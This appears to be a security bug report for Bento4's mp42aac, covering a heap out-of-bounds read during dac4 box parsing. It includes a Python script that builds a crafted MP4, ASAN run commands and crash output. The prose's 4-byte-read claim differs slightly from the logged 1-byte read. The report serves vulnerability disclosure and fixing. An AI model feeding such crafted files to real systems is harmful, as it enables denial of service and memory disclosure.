## Bug0: Heap Out-of-Bounds Read in AP4_BitReader::ReadCache During dac4 DSI Parsing

In `AP4_Dac4Atom::AP4_Dac4Atom()` in `Ap4Dac4Atom.cpp`, `AP4_BitReader::ReadCache()` reads a 4-byte word past the end of the allocated payload buffer with no bounds check present, causing a heap out-of-bounds read when parsing a crafted `dac4` box whose 11-byte payload is exhausted before all required bit fields are consumed.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(fourcc, data):
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('latin-1')
    size = 8 + len(data)
    return struct.pack('>I', size) + fourcc + data

def make_full_box(fourcc, version, flags, data):
    vf = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return make_box(fourcc, vf + data)

# dac4 payload: exactly 11 bytes (minimum to pass payload_size < 11 check)
#
# Bit layout (MSB first):
#   bits  0- 2 : ac4_dsi_version = 1        (3 bits: 001)
#   bits  3- 9 : bitstream_version = 1      (7 bits: 0000001)
#   bit  10    : fs_index = 0               (1 bit:  0)
#   bits 11-14 : frame_rate_index = 0       (4 bits: 0000)
#   bits 15-23 : n_presentations = 511      (9 bits: 111111111)
#   bits 24-87 : zeros (8 bytes padding)
#
# Byte 0: 0x20  Byte 1: 0x41  Byte 2: 0xFF  Bytes 3-10: 0x00
#
# After bit 24, the parser reads bit_rate_mode(2)+bit_rate(32)+bit_rate_precision(32).
# bit_rate_precision spans bits 58-89, crossing the 88-bit buffer boundary -> OOB.
dac4_payload = bytes([0x20, 0x41, 0xFF]) + bytes(8)
assert len(dac4_payload) == 11

dac4 = make_box('dac4', dac4_payload)

audio_entry_data = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +
    b'\x00' * 8 +
    struct.pack('>H', 2) +
    struct.pack('>H', 16) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    struct.pack('>I', 44100 << 16) +
    dac4
)
audio_entry = make_box('ac-4', audio_entry_data)

stsd = make_full_box('stsd', 0, 0, struct.pack('>I', 1) + audio_entry)
stts = make_full_box('stts', 0, 0, struct.pack('>I', 0))
stsc = make_full_box('stsc', 0, 0, struct.pack('>I', 0))
stsz = make_full_box('stsz', 0, 0, struct.pack('>II', 0, 0))
stco = make_full_box('stco', 0, 0, struct.pack('>I', 0))
stbl = make_box('stbl', stsd + stts + stsc + stsz + stco)

url_entry = make_full_box('url ', 0, 1, b'')
dref = make_full_box('dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = make_box('dinf', dref)
smhd = make_full_box('smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = make_box('minf', smhd + dinf + stbl)

mdhd_data = (
    struct.pack('>IIII', 0, 0, 44100, 0) +
    struct.pack('>HH', 0x55C4, 0)
)
mdhd = make_full_box('mdhd', 0, 0, mdhd_data)
hdlr_data = (
    struct.pack('>I', 0) +
    b'soun' +
    b'\x00' * 12 +
    b'SoundHandler\x00'
)
hdlr = make_full_box('hdlr', 0, 0, hdlr_data)
mdia = make_box('mdia', mdhd + hdlr + minf)

identity_matrix = struct.pack('>9I',
    0x00010000, 0x00000000, 0x00000000,
    0x00000000, 0x00010000, 0x00000000,
    0x00000000, 0x00000000, 0x40000000
)
tkhd_data = (
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +
    b'\x00' * 8 +
    struct.pack('>HHH', 0, 0, 0x0100) +
    b'\x00' * 2 +
    identity_matrix +
    struct.pack('>II', 0, 0)
)
tkhd = make_full_box('tkhd', 0, 3, tkhd_data)
trak = make_box('trak', tkhd + mdia)

mvhd_data = (
    struct.pack('>IIIII', 0, 0, 44100, 0, 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    identity_matrix +
    b'\x00' * 24 +
    struct.pack('>I', 2)
)
mvhd = make_full_box('mvhd', 0, 0, mvhd_data)
moov = make_box('moov', mvhd + trak)

ftyp_data = b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom'
ftyp = make_box('ftyp', ftyp_data)

mp4 = ftyp + moov
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)
print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
print(f"[+] dac4 payload (hex): {dac4_payload.hex()}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50200000013c at pc 0x56366f8ef2d0 bp 0x7ffedb392ef0 sp 0x7ffedb392ee0
READ of size 1 at 0x50200000013c thread T0
    #0 in AP4_BitReader::ReadBits(unsigned int)
    #1 in AP4_Dac4Atom::AP4_Dac4Atom(unsigned int, unsigned char const*)
0x50200000013c is located 0 bytes to the right of 12-byte region [0x502000000130,0x50200000013c)

### Impact

An attacker who supplies a crafted MP4 file with a minimal 11-byte `dac4` box payload can cause `AP4_BitReader::ReadCache()` to read bytes beyond the end of the heap-allocated buffer, exposing adjacent heap contents including metadata, pointer values, and data from other parsed boxes that can aid in bypassing ASLR and enable further exploitation. The vulnerable code path is reached by any invocation of mp42aac on an untrusted MP4 file, requiring no authentication or elevated privileges, making this an exploitable attack surface for any user-facing or automated pipeline that processes AC-4 audio content. Depending on heap layout, if the out-of-bounds read reaches an unmapped memory page the process will crash, constituting a reliable denial-of-service condition.
